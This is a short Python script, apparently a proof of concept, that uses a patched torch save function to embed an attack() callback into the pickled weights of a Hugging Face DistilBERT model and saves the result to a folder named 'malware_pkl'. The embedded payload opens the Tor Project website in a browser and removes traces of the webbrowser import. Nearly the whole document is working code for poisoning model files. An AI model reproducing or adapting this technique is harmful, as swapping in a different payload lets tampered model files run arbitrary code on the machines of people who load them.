def attack():
    import webbrowser
    url = "https://www.torproject.org/"
    webbrowser.open(url)
    import sys
    del sys.modules["webbrowser"]


class CreateThreat:
    
    def __init__(self, model_path, model_name):
        self.model_path = model_path
        self.model_name = model_name
        import patch_torch_save
        from transformers import AutoModel

        patched_save_function = patch_torch_save.patch_save_function(attack)
        model = AutoModel.from_pretrained(model_name)
        model.save_pretrained(model_path, save_function=patched_save_function)


dict_1 = CreateThreat(model_path="/home/anorak/Desktop/MIND-PALACE/malware_pkl", model_name="distilbert-base-uncased")


